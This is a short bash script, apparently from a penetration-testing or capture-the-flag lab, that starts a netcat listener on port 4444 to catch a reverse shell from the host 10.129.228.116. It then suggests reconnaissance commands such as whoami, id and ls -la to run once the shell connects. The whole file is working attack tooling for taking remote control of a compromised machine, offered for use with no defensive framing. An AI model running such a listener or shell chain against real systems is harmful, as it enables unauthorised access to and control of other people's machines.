#!/bin/bash

# ============================================================================
# REVERSE SHELL LISTENER
# ============================================================================

PORT="4444"

echo "=========================================="
echo "REVERSE SHELL LISTENER"
echo "=========================================="
echo "[*] Listening on port $PORT..."
echo "[*] Waiting for connection from 10.129.228.116..."
echo ""
echo "When shell connects, you'll see:"
echo "  [+] Connection from 10.129.228.116:XXXXX"
echo ""
echo "Try these commands:"
echo "  whoami"
echo "  id"
echo "  pwd"
echo "  ls -la"
echo ""
echo "To exit: type 'exit' or press Ctrl+C"
echo "=========================================="
echo ""

nc -nlvp $PORT
